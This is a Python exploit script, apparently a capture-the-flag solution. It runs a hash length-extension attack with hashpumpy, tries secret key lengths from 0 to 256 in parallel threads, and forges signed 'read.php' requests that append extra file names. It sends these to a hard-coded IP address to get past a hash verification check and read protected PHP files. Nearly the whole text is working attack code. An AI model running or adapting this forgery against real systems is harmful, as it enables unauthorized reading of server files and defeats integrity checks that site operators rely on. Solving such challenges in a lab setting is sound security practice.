#!/usr/bin/python3
import hashpumpy
from requests import post
from warnings import filterwarnings
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
from get_hash import gen

#* who likes warnings in clean code right.... so forget about them
filterwarnings("ignore", category=DeprecationWarning)

#? variables
hash_we_have = "184b5d255817fc0afe9316e67c8f386506a3b28b470c94f47583b76c7c0ec1e5"
headers = {"User-Agent": "Uchiha"}
url = "http://3.141.159.106/"
threads = 20


def check(key_length):
	#new_hash, msg = hashpumpy.hashpump(hash_we_have, "read.php", ":index.php:guinjutsu.php", key_length)

	#print(f"hash: {new_hash}, Msg: {msg}, Key Length: {key_length}")
	#print(new_hash + f"|{msg.decode()}")
	# break
	#exit(1)

	new_hash, msg = gen(key_length)
	payload = (new_hash +'|' + str(msg).replace('b','').replace("'",''))
	# print(payload)
	# exit()
	
	data = {"string" : f"{payload}"}
	#data = {"string" : hash_we_have + "|read.php"}
	#print(f"{Fore.YELLOW}[*]{Fore.GREEN}Sending Request!!!{Style.RESET_ALL}")
	
	r = post(url + "read.php?", headers=headers, data=data)
	body_len = len(r.request.body if r.request.body else [])

	#print(r.text)
	print(body_len)
	#break
	#exit(-1)

	if('echo "Access Denied. Only Uchiha clan can access this";' and 'Verification Failed! You didn\'t awaken your sharingan!' in r.text):
		if body_len > 300 : 
			print(f"{Fore.RED}[*]Cracked!!!{Style.RESET_ALL}")
			print(f"{Fore.RED}hash: {new_hash}, Msg: {msg}, Key Length: {key_length}{Style.RESET_ALL}")
			print(f"{Fore.MAGENTA}{new_hash}|{msg.decode('windows-1252')}{Style.RESET_ALL}")
			print(r.text)
			#exit(1)

print(f"{Fore.YELLOW}[*]Running....{Style.RESET_ALL}")

with ThreadPoolExecutor(max_workers=threads) as executor:
	#* iterate through all 256 combinatons
	for key_length in range(257):
		t = executor.submit(check, key_length)
		#print(t.result())
		#break

# new_hash, msg = hashpumpy.hashpump(hash_we_have, "read.php", ":guinjutsu.php", 1)

# print(f"hash: {new_hash}, Msg: {msg}")
# print(new_hash + f"|{msg.decode('windows-1252')}")